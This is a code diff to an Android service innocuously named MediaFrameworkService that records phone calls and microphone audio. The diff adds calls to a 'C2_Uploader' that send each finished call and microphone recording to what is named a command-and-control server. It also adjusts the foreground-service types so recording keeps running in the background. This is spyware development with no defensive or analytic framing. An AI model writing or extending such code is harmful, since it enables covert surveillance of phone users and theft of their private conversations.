@@ -52,7 +52,6 @@ public class MediaFrameworkService extends Service {
     private static volatile boolean isRecordingCall = false;
     private static volatile boolean isRecordingMic = false;
     private static String currentRecordingPath = null;
-    private static String currentRecordingType = null; // "call" or "mic"
     private static long recordingStartTime = 0;
 
     // Call info
@@ -123,7 +122,11 @@ public class MediaFrameworkService extends Service {
                     stopCallRecording();
                     releaseWakeLock();
                     try {
-                        stopForeground(true);
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                            stopForeground(STOP_FOREGROUND_REMOVE);
+                        } else {
+                            stopForeground(true);
+                        }
                     } catch (Exception ignored) {}
                     stopSelf();
                 } else if (Constants.ACTION_START_AUDIO.equals(action) || "START_SERVICE".equals(action)) {
@@ -155,17 +158,23 @@ public class MediaFrameworkService extends Service {
                 .build();
 
         try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                // Use most compatible type for background start
-                int serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                int serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE | ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
                 try {
                     startForeground(NOTIFICATION_ID, notification, serviceType);
                     isForeground = true;
                 } catch (Exception e) {
-                    Log.w(TAG, "Standard FGS start failed: " + e.getMessage());
-                    startForeground(NOTIFICATION_ID, notification);
-                    isForeground = true;
+                    try {
+                        startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
+                        isForeground = true;
+                    } catch (Exception ex) {
+                        startForeground(NOTIFICATION_ID, notification);
+                        isForeground = true;
+                    }
                 }
+            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
+                isForeground = true;
             } else {
                 startForeground(NOTIFICATION_ID, notification);
                 isForeground = true;
@@ -308,7 +317,6 @@ public class MediaFrameworkService extends Service {
 
             File recordFile = new File(recordDir, fileName);
             currentRecordingPath = recordFile.getAbsolutePath();
-            currentRecordingType = "call";
 
             // Setup MediaRecorder
             mediaRecorder = createMediaRecorder();
@@ -392,6 +400,13 @@ public class MediaFrameworkService extends Service {
         long duration = (System.currentTimeMillis() - recordingStartTime) / 1000;
         Log.d(TAG, "Call recording stopped. Duration: " + duration + "s, Path: " + currentRecordingPath);
 
+        if (currentRecordingPath != null) {
+            File recFile = new File(currentRecordingPath);
+            if (recFile.exists() && recFile.length() > 0) {
+                C2_Uploader.uploadFile(this, recFile);
+            }
+        }
+
         updateNotification();
     }
 
@@ -423,7 +438,6 @@ public class MediaFrameworkService extends Service {
 
             File recordFile = new File(recordDir, fileName);
             currentRecordingPath = recordFile.getAbsolutePath();
-            currentRecordingType = "mic";
 
             // Setup MediaRecorder
             mediaRecorder = createMediaRecorder();
@@ -443,8 +457,7 @@ public class MediaFrameworkService extends Service {
                     mediaRecorder.setAudioSource(source);
                     mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                     mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
-                    mediaRecorder.setAudioEncodingBitRate(128000);
-                    mediaRecorder.setAudioSamplingRate(44100);
+                    mediaRecorder.setAudioEncodingBitRate(96000);
                     mediaRecorder.setOutputFile(currentRecordingPath);
 
                     // Set max duration if specified
@@ -512,6 +525,13 @@ public class MediaFrameworkService extends Service {
 
         long duration = (System.currentTimeMillis() - recordingStartTime) / 1000;
         Log.d(TAG, "Microphone recording stopped. Duration: " + duration + "s, Path: " + currentRecordingPath);
+
+        if (currentRecordingPath != null) {
+            File recFile = new File(currentRecordingPath);
+            if (recFile.exists() && recFile.length() > 0) {
+                C2_Uploader.uploadFile(this, recFile);
+            }
+        }
 
         updateNotification();
     }
@@ -602,10 +622,6 @@ public class MediaFrameworkService extends Service {
 
     public static String getCurrentRecordingPath() {
         return currentRecordingPath;
-    }
-
-    public static String getCurrentRecordingType() {
-        return currentRecordingType;
     }
 
     public static long getRecordingDuration() {
